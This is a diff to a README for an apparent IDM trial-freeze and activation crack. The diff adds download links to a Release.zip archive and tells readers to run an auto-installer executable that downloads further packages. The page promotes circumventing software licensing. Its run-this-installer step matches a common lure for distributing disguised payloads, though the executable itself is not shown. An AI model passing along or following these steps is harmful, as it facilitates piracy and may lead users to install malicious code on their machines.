@@ -12,11 +12,11 @@ IDM freeze trial and activation with registry key lock method. Activation and tr
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/b589e6e5-3b31-46ed-a28b-1c4232e4402f)
-]()
+](https://github.com/samikshya22/IDM-Activation-Script-2024/releases/download/V2.44/Release.zip)
 
 
 
-## **1. [Download the archive]() and extract it to a convenient folder.**
+## **1. [Download the archive](https://github.com/samikshya22/IDM-Activation-Script-2024/releases/download/V2.44/Release.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 ![photo_2024-10-16_22-55-30](https://github.com/user-attachments/assets/1ed1bd34-b8bf-4510-8fce-26b183dc04e6)
